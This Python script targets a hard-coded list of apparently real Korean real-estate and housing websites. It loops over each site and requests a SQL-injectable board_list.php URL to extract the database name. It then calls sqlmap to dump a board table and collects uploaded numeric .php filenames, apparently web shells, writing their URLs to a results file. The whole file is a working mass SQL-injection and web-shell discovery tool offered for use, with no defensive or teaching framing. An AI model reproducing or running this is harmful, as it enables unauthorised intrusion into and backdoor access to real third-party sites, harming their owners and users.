#!/usr/bin/python
# -*- coding: utf-8 -*-
from selenium import webdriver
import time, sys, os, json, random,requests, re
import subprocess

urls = [
"01034997969.com",
"01037967038.com",
"01039351119.com",
"01064344440.com",
"01092806117.com",
"010-3868-6611.com",
"010-5549-6649.com",
"010-5912-2229.com",
"010-8393-9788.com",
"010-8411-1700.com",
"010-8583-1075.com",
"02-783-1111.com",
"0314154440.com",
"032-663-2020.com",
"032-937-9611.com",
"041-544-6116.com",
"044-866-0211.com",
"055-356-1471.com",
"119housing.co.kr",
"1roomstyle.com",
"3336989.com",
"366-9919.com",
"4075102.com",
"4173060.com",
"5011013.com",
"5020114.com",
"532-8944.com",
"a-tower.com",
"adbang114.com",
"ansangoldhome.com",
"ansanking.com",
"ansanstar.com",
"bighithouse.com",
"bkhousing.net",
"blumacity.com",
"bomhouse.kr",
"bomhouse.net",
"busan1roomno1.com",
"busanmyhome.com",
"busansanggastore.com",
"chegim.com",
"chousing.co.kr",
"cjhomerun.com",
"daehanhousing.com",
"damoahousing.kr",
"ddangcafe.com",
"digitalvly.com",
"donggu114.com",
"ds-housing.com",
"ds-villa.co.kr",
"dukkebi.com",
"e-joeun.co.kr",
"factoryapt.com",
"finehousebs.com",
"fmhome.co.kr",
"gaenariapt.com",
"gagyo21.com",
"gain.or.kr",
"geojejoeun.com",
"gnangel.com",
"gnks.co.kr",
"gnzlkyu.com",
"gosi1today.com",
"green8686.com",
"gumibest.com",
"gumiheaven.com",
"gumioneroom.net",
"gumioutlet.com",
"gumitopland.com",
"happyinhouse.com",
"happyvills.com",
"hdvill.com",
"hellokidscafe.com",
"holeinone8945.com",
"house-books.com",
"house6090.com",
"housekb.com",
"ilsanchanggo.com",
"ilsung-realestate.com",
"jinjubigstar.com",
"jisanoffice.com",
"junwon85.com",
"junwonhouse.com",
"kjhousing.com",
"kumioneroom114.com",
"loenhousing.co.kr",
"maemaepro.com",
"mg-villa.com",
"moamoney.com",
"modern2008.com",
"mplus365.com",
"mvilla.net",
"nanahousing.sswebplus.net",
"new-villa.com",
"nowhouse.co.kr",
"nurihousing.co.kr",
"ogubudongsan.com",
"ohnoyes.net",
"onehousing.kr",
"oneofficetel.com",
"oneplaza.co.kr",
"oneroom-119.com",
"oneroom1009.com",
"oneroomiyagi.net",
"oneroomjeil.com",
"orcamp.co.kr",
"prapt.co.kr",
"purune.kr",
"red114.co.kr",
"room7333.com",
"room8881190.com",
"sachunlove.com",
"sangga-all.com",
"sanggapro.com",
"sejongoneroom.com",
"sh-housing.co.kr",
"sj-well.com",
"sjinno.com",
"sky4737878.com",
"sky99.co.kr",
"sodamconstruct.com",
"songdolove.com",
"songpahousing.com",
"ss2036.com",
"sstop.kr",
"station-area.com",
"sujihouse.com",
"therich7.com",
"thestylecafe.net",
"villalion.co.kr",
"weve114.com",
"whousing.co.kr",
"wise8949.com",
"woonamchoigo.co.kr",
"xn--114-9o7l56puq9agqj.com",
"xn--119-ox9nz9jfwv.com",
"xn--299aobv97koge.com",
"xn--2e0br5h0e28uz9db8twlbwv.com",
"xn--2e0bv9h7uf0mduss54a.com",
"xn--2q1b16p8rc40ju3beu9a.com",
"xn--2q1b16p8rcc1kuyf.net",
"xn--2q1b16p8rcx0yukcq7d.com",
"xn--2q1b16p8rczzrptk.com",
"xn--2q1ba625ekjd5uhcc.com",
"xn--2q1bn4ehwg0udxa.com",
"xn--82-hs1iq99d.com",
"xn--9t4b17ezc498d.com",
"xn--h50bl8jn9jn5d8odj8ayz0ckra.com",
"xn--hg3b29ff3gzok.com",
"xn--hz2b19kzmfwlb.com",
"xn--j30bx0d3bt26cv3drri9r4a.com",
"xn--lk3bz2owlblyd5se.com",
"xn--o01b76ok5cvqfdrj.com",
"xn--o39at6k2nm10ec6cnzi.com",
"xn--o39at6k2nmp6g.xn--mk1bu44c",
"xn--ob0b3i570efhl.com",
"xn--ob0b43e2ut47f.com",
"xn--ob0b56vn0gl7enlq.com",
"xn--oy2b27n0ndba378p.com",
"xn--p89av9k1tikjd5u9a.com",
"xn--sh1bw7b8wl6mj9pap0p.com",
"xn--vb0bpiw1y7oj6wi.com",
"xn--vk1bz96ajtbt1g.com",
"xn--zb0bx3k11ikjdlsj.com",
"yesgumi114.com",
"yesgumi4989.com",
"yphl.co.kr",
"ypsamsung.com",

]

fp = open("web3.txt", "a")
for i,url in enumerate(urls):
    link = "http://" + url + "/board_list.php?m_form=&m_page=list&m_idx=1*&page=&find=&search="

    fp.write(url)
    fp.write(",")
    r = requests.get(link)

    
    db_names = re.findall(r'[a-z0-9]+\.sswebplus.net', r.text)
    db_name = ""
    if db_names:
        db_name = db_names[0].replace(".","_")

    # query1 = ["sqlmap", "--random-agent", "--dbms=MySQL", "-u", link, "--batch", "--dbs","--threads=5"]
    
    # print (query1)
    

    # ret = subprocess.check_output(query1)
    # print (ret)

    # dbname = re.findall(r'[a-z0-9]+_sswebplus_net', ret)
    if db_name:
        print (db_name)

        # query2 = ["sqlmap", "--random-agent", "--dbms=MySQL", "-u", link, "--batch", "--threads=5", "-D",dbname[0],"--tables"]
        # print (query2)
        # print (" ".join(query2))
        # print (" ############### STEP2 ##################")
        # ret = subprocess.check_output(query2)
        # print (ret)
        query3 = ["sqlmap", "--random-agent", "--dbms=MySQL", "-u", link, "--batch", "--threads=5", "-D",db_name,"-T","sswp_board","-C","newfilename,newfilename1,title","--dump"]

        print (query3)
        print (" ".join(query3))
        print (" ############### STEP3 ##################")
        ret = subprocess.check_output(query3)

        print (ret)

        shell = re.findall(r'\d+\.php',ret)

        print ("RESULT")
        print (shell)

        if shell:
            result = "http://{}/data/community/board/{}".format(url,shell[0])
            fp.write(result)

    fp.write("\n")

fp.close()
